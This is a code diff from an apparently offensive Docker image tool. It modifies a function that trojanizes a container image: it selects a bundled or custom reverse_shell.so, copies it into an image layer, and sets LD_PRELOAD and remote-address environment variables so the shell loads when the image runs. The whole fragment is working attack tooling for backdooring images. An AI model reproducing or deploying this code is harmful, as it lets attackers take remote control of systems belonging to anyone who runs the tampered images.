@@ -2,7 +2,6 @@ import json
 import os.path
 import logging
 
-from dockerscan.actions.image.docker_api import read_file_from_image
 from .model import *
 from ..docker_api import *
 
@@ -25,6 +24,14 @@ def run_image_modify_trojanize_dockerscan(
     if not output_docker_image.endswith("tar"):
         output_docker_image += ".tar"
 
+    # Choice the shell
+    if not config.custom_shell:
+        SHELL_PATH = os.path.join(os.path.dirname(__file__),
+                                  "shells",
+                                  "reverse_shell.so")
+    else:
+        SHELL_PATH = os.path.abspath(config.custom_shell)
+
     # 1 - Get layers info
     log.debug(" > Opening docker file")
     with open_docker_image(image_path,
@@ -42,13 +49,10 @@ def run_image_modify_trojanize_dockerscan(
 
             # 3 - Copy the shell
             log.info(" > Coping the shell: 'reverse_shell.so' "
-                     "to '/etc/profile'")
+                     "to '{}'".format(REMOTE_SHELL_PATH))
 
-            shell_path = os.path.join(os.path.dirname(__file__),
-                                      "shells",
-                                      "reverse_shell.so")
             copy_file_to_image_folder(d,
-                                      shell_path,
+                                      SHELL_PATH,
                                       REMOTE_SHELL_PATH)
 
             new_layer_path, new_layer_digest = \
@@ -61,8 +65,8 @@ def run_image_modify_trojanize_dockerscan(
 
             # Add new enviroment vars with LD_PRELOAD AND REMOTE ADDR
             json_info_last_layer = read_file_from_image(img,
-                                             "{}/json".format(
-                                                 old_layer_digest))
+                                                        "{}/json".format(
+                                                            old_layer_digest))
 
             json_info_last_layer = json.loads(json_info_last_layer.decode())
 
